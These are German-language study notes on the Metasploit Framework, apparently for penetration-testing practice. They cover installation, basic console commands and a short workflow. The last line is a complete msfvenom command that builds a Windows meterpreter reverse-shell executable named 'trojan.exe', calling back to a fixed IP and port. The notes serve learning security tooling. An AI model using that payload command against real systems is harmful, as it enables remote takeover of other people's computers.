MSF - Metasploit Framework

-            Ist in Kali bereits vorinstalliert

Installation auf Debian bzw. Ubuntu:

  

curl [https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb](https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb) > msfinstall && \

  chmod 755 msfinstall && \

  ./msfinstall

  

-            Es existiert eine grafische Benutzeroberfläche: **Armitage**

  

-            Workspaces verwalten (workspace …) -> “help workspace”

-            “search” -> Um gezielt nach Keywords zu suchen

-            Show payload

-            Info -> Zeigt weitere Informationen zu einem Modul an. (z.B. die benötigten Parameter -> RHOSTS/ RPORT, …)

Vorgehensweise:

- Strategrie planen

- z.B. mit search nach dem passenden Modul suchen

- mit dem Befehl „info“ lässt man sich weitere Infos zum gewünschten Modu anzeigen, um in Erfahrung zu bringen welche Parameter alle „required“ sind

-            Das Kommando „use“ benutzen, um ein modul auszuführen

-            Eventuell vorher noch eine angepasste Payload über msfvenom erstellen.

Beispiel für eine Reverse Shell:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.229 LPORT=4444 -f exe > trojan.exe